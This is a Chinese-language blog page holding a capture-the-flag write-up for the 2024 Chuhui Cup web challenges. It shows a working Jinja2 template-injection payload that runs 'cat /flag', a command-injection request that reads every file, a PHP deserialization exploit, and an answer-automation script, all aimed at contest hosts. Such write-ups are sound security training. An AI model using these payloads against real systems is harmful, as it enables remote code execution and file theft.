

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">

  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
  <link rel="icon" href="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412222328446.jpg">
  

  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="XU17">
  <meta name="keywords" content="">
  
    <meta name="description" content="2024 楚慧杯 Writeup by Pwn13ss">
<meta property="og:type" content="article">
<meta property="og:title" content="2024 楚慧杯 Writeup">
<meta property="og:url" content="http://example.com/2024/12/20/2024%20%E6%A5%9A%E6%85%A7%E6%9D%AF%20wp/index.html">
<meta property="og:site_name" content="XU17">
<meta property="og:description" content="2024 楚慧杯 Writeup by Pwn13ss">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412201849619.png">
<meta property="article:published_time" content="2024-12-20T09:20:11.000Z">
<meta property="article:modified_time" content="2024-12-24T11:58:10.338Z">
<meta property="article:author" content="XU17">
<meta property="article:tag" content="CTF">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412201849619.png">
  
  
  
  <title>2024 楚慧杯 Writeup - XU17</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- 主题依赖的图标库，不要自行修改 -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">



<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  




  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":"Hh0qQAnE7Hsu4FeGu84fiWVS-gzGzoHsz","app_key":"wRTMLUJSKcLNxEGBSEvSGJ4x","server_url":"https://hh0qqane.lc-cn-n1-shared.com","path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  

  

  

  

  

  
    
  



  
<meta name="generator" content="Hexo 7.3.0"></head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>XU17&#39;s Blog</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/" target="_self">
                <i class="iconfont icon-home-fill"></i>
                <span>首页</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/" target="_self">
                <i class="iconfont icon-archive-fill"></i>
                <span>归档</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/" target="_self">
                <i class="iconfont icon-category-fill"></i>
                <span>分类</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/" target="_self">
                <i class="iconfont icon-tags-fill"></i>
                <span>标签</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/links/" target="_self">
                <i class="iconfont icon-link-fill"></i>
                <span>友链</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/" target="_self">
                <i class="iconfont icon-user-fill"></i>
                <span>关于</span>
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              <i class="iconfont icon-search"></i>
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
            </a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412201849619.png') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="2024 楚慧杯 Writeup"></span>
          
        </div>

        
          
  <div class="mt-3">
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2024-12-20 17:20" pubdate>
          2024年12月20日 下午
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          4.7k 字
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          40 分钟
        
      </span>
    

    
    
      
        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
          <i class="iconfont icon-eye" aria-hidden="true"></i>
          <span id="leancloud-page-views"></span> 次
        </span>
        
      
      
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <h1 id="seo-header">2024 楚慧杯 Writeup</h1>
            
            
              <div class="markdown-body">
                
                <h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="1-1"><a href="#1-1" class="headerlink" title="1-1"></a>1-1</h3><ul>
<li>保持Header发包就行</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> re<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_expression</span>(<span class="hljs-params">response_text</span>):<br>    <span class="hljs-comment"># 使用正则表达式匹配算术表达式</span><br>    <span class="hljs-keyword">match</span> = re.search(<span class="hljs-string">r&#x27;Calculate: (\d+) ([+\-*/]) (\d+)&#x27;</span>, response_text)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">match</span>:<br>        num1, operator, num2 = <span class="hljs-keyword">match</span>.groups()<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">int</span>(num1), operator, <span class="hljs-built_in">int</span>(num2)<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>, <span class="hljs-literal">None</span>, <span class="hljs-literal">None</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">calculate_expression</span>(<span class="hljs-params">num1, operator, num2</span>):<br>    <span class="hljs-comment"># 计算算术表达式的结果</span><br>    <span class="hljs-keyword">if</span> operator == <span class="hljs-string">&#x27;+&#x27;</span>:<br>        <span class="hljs-keyword">return</span> num1 + num2<br>    <span class="hljs-keyword">elif</span> operator == <span class="hljs-string">&#x27;-&#x27;</span>:<br>        <span class="hljs-keyword">return</span> num1 - num2<br>    <span class="hljs-keyword">elif</span> operator == <span class="hljs-string">&#x27;*&#x27;</span>:<br>        <span class="hljs-keyword">return</span> num1 * num2<br>    <span class="hljs-keyword">elif</span> operator == <span class="hljs-string">&#x27;/&#x27;</span>:<br>        <span class="hljs-keyword">if</span> num2 != <span class="hljs-number">0</span>:<br>            <span class="hljs-keyword">return</span> num1 / num2<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">raise</span> ValueError(<span class="hljs-string">&quot;除数不能为0&quot;</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">poc_szfIR</span>(<span class="hljs-params">url, headers, answer</span>):<br>    res = requests.post(url=url, headers=headers, data=&#123;<span class="hljs-string">&quot;answer&quot;</span>: answer&#125;, verify=<span class="hljs-literal">False</span>)<br>    <span class="hljs-keyword">return</span> res.text<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    url = <span class="hljs-string">&quot;http://139.155.126.78:21851/&quot;</span><br>    headers = &#123;<br>        <span class="hljs-string">&quot;Accept&quot;</span>: <span class="hljs-string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&quot;</span>,<br>        <span class="hljs-string">&quot;Accept-Encoding&quot;</span>: <span class="hljs-string">&quot;gzip, deflate&quot;</span>,<br>        <span class="hljs-string">&quot;Accept-Language&quot;</span>: <span class="hljs-string">&quot;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&quot;</span>,<br>        <span class="hljs-string">&quot;Content-Length&quot;</span>: <span class="hljs-string">&quot;8&quot;</span>,<br>        <span class="hljs-string">&quot;Content-Type&quot;</span>: <span class="hljs-string">&quot;application/x-www-form-urlencoded&quot;</span>,<br>        <span class="hljs-string">&quot;Cookie&quot;</span>: <span class="hljs-string">&quot;PHPSESSID=2028d8a46dded801e712c2b7004cd268&quot;</span>,<br>        <span class="hljs-string">&quot;Host&quot;</span>: <span class="hljs-string">&quot;139.155.126.78:21851&quot;</span>,<br>        <span class="hljs-string">&quot;Origin&quot;</span>: <span class="hljs-string">&quot;http://139.155.126.78:21851&quot;</span>,<br>        <span class="hljs-string">&quot;Priority&quot;</span>: <span class="hljs-string">&quot;u=0, i&quot;</span>,<br>        <span class="hljs-string">&quot;Referer&quot;</span>: <span class="hljs-string">&quot;http://139.155.126.78:21851&quot;</span>,<br>        <span class="hljs-string">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class="hljs-string">&quot;1&quot;</span>,<br>        <span class="hljs-string">&quot;User-Agent&quot;</span>: <span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0&quot;</span><br>    &#125;<br>    correct_count = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">30</span>):<br>        response = requests.get(url, headers=headers, verify=<span class="hljs-literal">False</span>)<br>        <span class="hljs-keyword">if</span> response.status_code == <span class="hljs-number">200</span>:<br>            num1, operator, num2 = get_expression(response.text)<br>            <span class="hljs-keyword">if</span> num1 <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">and</span> operator <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">and</span> num2 <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>                <span class="hljs-keyword">try</span>:<br>                    answer = calculate_expression(num1, operator, num2)<br>                    result = poc_szfIR(url, headers, <span class="hljs-built_in">str</span>(answer))<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;提交答案: <span class="hljs-subst">&#123;answer&#125;</span>, 服务器响应: <span class="hljs-subst">&#123;result&#125;</span>&quot;</span>)<br>                    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;Correct&quot;</span> <span class="hljs-keyword">in</span> result:<br>                        correct_count += <span class="hljs-number">1</span><br>                <span class="hljs-keyword">except</span> ValueError <span class="hljs-keyword">as</span> e:<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;计算错误: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;未能找到有效的算术表达式，跳过提交&quot;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;请求失败，状态码: <span class="hljs-subst">&#123;response.status_code&#125;</span>&quot;</span>)<br>        <span class="hljs-comment"># time.sleep(1)  # 每次请求间隔1秒，避免过于频繁的请求</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;正确次数: <span class="hljs-subst">&#123;correct_count&#125;</span>/30&quot;</span>)<br></code></pre></td></tr></table></figure>

<p><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412201908819.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412201908859.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<h3 id="1-2"><a href="#1-2" class="headerlink" title="1-2"></a>1-2</h3><ul>
<li><code>search</code>处<code>SSTI  &#123;&#123;100-2&#125;&#125;</code></li>
</ul>
<p><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412201908673.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<ul>
<li>fenjing一把嗦</li>
</ul>
<p><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412201908835.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<ul>
<li>payload</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Python">提交表单完成，返回值为<span class="hljs-number">200</span>，输入为&#123;<span class="hljs-string">&#x27;name&#x27;</span>: <span class="hljs-string">&quot;&#123;%print ((g.pop.__globals__.__getitem__(&#x27;__b&#x27;&#x27;uiltins__&#x27;)).__getitem__(&#x27;__i&#x27;&#x27;mport__&#x27;))(&#x27;os&#x27;).popen(&#x27;c&#x27;&#x27;at /flag&#x27;).read()%&#125;&quot;</span>&#125;，表单为&#123;<span class="hljs-string">&#x27;action&#x27;</span>: <span class="hljs-string">&#x27;/search&#x27;</span>, <span class="hljs-string">&#x27;method&#x27;</span>: <span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;inputs&#x27;</span>: &#123;<span class="hljs-string">&#x27;name&#x27;</span>&#125;&#125;<br></code></pre></td></tr></table></figure>

<h3 id="1-3"><a href="#1-3" class="headerlink" title="1-3"></a>1-3</h3><ul>
<li>C处RCE</li>
<li>先ls，题目提示了pop，找pop文件</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs Python">POST /index.php HTTP/<span class="hljs-number">1.1</span><br>Host: <span class="hljs-number">139.155</span><span class="hljs-number">.126</span><span class="hljs-number">.78</span>:<span class="hljs-number">31743</span><br>Accept-Language: zh-CN,zh;q=<span class="hljs-number">0.8</span>,zh-TW;q=<span class="hljs-number">0.7</span>,zh-HK;q=<span class="hljs-number">0.5</span>,en-US;q=<span class="hljs-number">0.3</span>,en;q=<span class="hljs-number">0.2</span><br>Accept-Encoding: gzip, deflate<br>User-Agent: Mozilla/<span class="hljs-number">5.0</span> (Windows NT <span class="hljs-number">10.0</span>; Win64; x64; rv:<span class="hljs-number">133.0</span>) Gecko/<span class="hljs-number">20100101</span> Firefox/<span class="hljs-number">133.0</span><br>Origin: http://<span class="hljs-number">139.155</span><span class="hljs-number">.126</span><span class="hljs-number">.78</span>:<span class="hljs-number">31743</span><br>Cookie: PHPSESSID=2028d8a46dded801e712c2b7004cd268; session=.eJyrVko1SjS1SDQy0DVLMrfUNTE3Mda1TDZL0000Tk02S7E0ME9JTFayUvJ1CnNW0lEqTi0uzszPi89MAYoRpbUWAEKLG1k.Z2T3ow.us-IsOtP-<span class="hljs-number">4</span>inTDaqKWGYEDJ8oOI<br>Content-<span class="hljs-type">Type</span>: application/x-www-form-urlencoded<br>Accept: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0.9</span>,*/*;q=<span class="hljs-number">0.8</span><br>Priority: u=<span class="hljs-number">0</span>, i<br>Upgrade-Insecure-Requests: <span class="hljs-number">1</span><br>Referer: http://<span class="hljs-number">139.155</span><span class="hljs-number">.126</span><span class="hljs-number">.78</span>:<span class="hljs-number">31743</span>/index.php<br>Content-Length: <span class="hljs-number">18</span><br><br>lsj=<span class="hljs-number">1.1</span><span class="hljs-number">.1</span><span class="hljs-number">.2</span>%3Bnl+*<br>nl *  读取所有文件<br></code></pre></td></tr></table></figure>

<ul>
<li>读到<code>p0pmart.php</code>文件</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><code class="hljs Python">&lt;?php<br>error_reporting(<span class="hljs-number">0</span>);<br>require_once(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">popmart</span>&#123;<br>    public $yuki;<br>    public $molly;<br>    public $dimoo;<br><br>    public function __construct()&#123;<br>        $this-&gt;yuki=<span class="hljs-string">&#x27;tell me where&#x27;</span>;<br>        $this-&gt;molly=<span class="hljs-string">&#x27;dont_tell_you&#x27;</span>;<br>        $this-&gt;dimoo=<span class="hljs-string">&quot;you_can_guess&quot;</span>;<br>    &#125;<br><br>    public function __wakeup()&#123;<br>        <span class="hljs-keyword">global</span> $flag;<br>        <span class="hljs-keyword">global</span> $where_you_go;<br>        $this-&gt;yuki=$where_you_go;<br><br>        <span class="hljs-keyword">if</span>($this-&gt;molly === $this-&gt;yuki)&#123;<br>            echo $flag;<br>        &#125;<br>    &#125;<br>&#125;<br><br>$pucky = $_GET[<span class="hljs-string">&#x27;wq&#x27;</span>];<br><span class="hljs-keyword">if</span>(isset($pucky))&#123;<br>    <span class="hljs-keyword">if</span>($pucky===<span class="hljs-string">&quot;二仙桥&quot;</span>)&#123;<br>        extract($_POST);<br>        <span class="hljs-keyword">if</span>($pucky===<span class="hljs-string">&quot;二仙桥&quot;</span>)&#123;    <br>            die(<span class="hljs-string">&quot;&lt;script&gt;window.alert(&#x27;说说看，你要去哪？？&#x27;);&lt;/script&gt;&quot;</span>);<br>        &#125;<br>        unserialize($pucky);<br>    &#125;<br>&#125;<br><br>error_reporting(<span class="hljs-number">0</span>);<br>include <span class="hljs-string">&quot;auth.php&quot;</span>;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Als</span>&#123;<br>    public $text;<br>    public $<span class="hljs-built_in">dict</span>;<br><br>    public function __wakeup()<br>    &#123;<br>        <span class="hljs-keyword">if</span> ($this-&gt;text == <span class="hljs-string">&quot;helloworld&quot;</span>)&#123;<br>            $this-&gt;<span class="hljs-built_in">dict</span>-&gt;init();<br>        &#125;<br>    &#125;<br><br>    public function __toString()<br>    &#123;<br>       $this-&gt;text-&gt;undefinedProperty = <span class="hljs-string">&#x27;New Value&#x27;</span>;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;HACKER&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Kl</span>&#123;<br>    public $apple;<br>    public $phone;<br>    public $var;<br><br>    public function __call($name, $arguments)<br>    &#123;<br>         echo $this-&gt;apple;<br>    &#125;<br><br>    public function __get($name)<br>    &#123;<br>        foreach($_GET <span class="hljs-keyword">as</span> $key =&gt; $value)&#123;<br>            $$key=$$value;<br>        &#125;<br>        <span class="hljs-keyword">if</span> ($_GET==<span class="hljs-string">&quot;Hack&quot;</span>)&#123;<br>            <span class="hljs-keyword">if</span> (isset($this-&gt;var))&#123;<br>                $arr[$this-&gt;var]=<span class="hljs-number">1</span>;<br>                <span class="hljs-keyword">if</span> ($arr[]=<span class="hljs-number">1</span>)&#123;<br>                    die(<span class="hljs-string">&quot;Hack!!&quot;</span>);<br>                &#125;<br>                <span class="hljs-keyword">else</span>&#123;<br>                    $this-&gt;content = file_get_contents($this -&gt; phone);<br>                    echo $this-&gt;content;<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Glb</span>&#123;<br>    public $boy;<br>    public $gay;<br>    private $cc;<br><br>    public function init($a,$b) &#123;<br>        $this-&gt;boy=$a;<br>        $this-&gt;gay=$b;<br>    &#125;<br><br>    public function __<span class="hljs-built_in">set</span>($name, $value)<br>    &#123;<br>        <span class="hljs-keyword">if</span>(isset($this-&gt;boy))&#123;<br>            print_r(<span class="hljs-string">&quot;1314&quot;</span>);<br>            <span class="hljs-keyword">return</span> $this-&gt;boy-&gt;name;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(isset($_POST[<span class="hljs-string">&#x27;cmd&#x27;</span>])) &#123;<br>    $serializecmd = $_POST[<span class="hljs-string">&#x27;cmd&#x27;</span>];<br>    $unserializecmd = unserialize($serializecmd);<br>    $unserializecmd-&gt;init();<br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br>    highlight_file(__FILE__);<br>&#125;<br>?&gt;<br></code></pre></td></tr></table></figure>

<ul>
<li>wq&#x3D;二仙桥，extract函数覆盖pubcky使他≠二仙桥__wakeup()函数，yuki&#x3D;molly,再用extract变量覆盖，EXP如下</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs Python">&lt;?php<br>    <span class="hljs-keyword">class</span> <span class="hljs-title class_">popmart</span>&#123;<br>        public $yuki;<br>        public $molly;<br>        public $dimoo;<br>        public function __construct()&#123;<br>            $this-&gt;yuki=<span class="hljs-string">&#x27;tell me where&#x27;</span>;<br>            $this-&gt;molly=<span class="hljs-string">&#x27;dont_tell_you&#x27;</span>;<br>            $this-&gt;dimoo=<span class="hljs-string">&quot;you_can_guess&quot;</span>;<br>        &#125;<br>        public function __wakeup()&#123;<br>            <span class="hljs-keyword">global</span> $flag;<br>            <span class="hljs-keyword">global</span> $where_you_go;<br>            $this-&gt;yuki=$where_you_go;<br>            <span class="hljs-keyword">if</span>($this-&gt;molly === $this-&gt;yuki)&#123;<br>                echo $flag;<br>            &#125;<br>        &#125;<br>    &#125;<br>    $a = new popmart();<br>    $b = serialize($a);<br>    echo $b;<br>?&gt;<br></code></pre></td></tr></table></figure>

<p><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412201908660.png" srcset="/img/loading.gif" lazyload alt="img"></p>
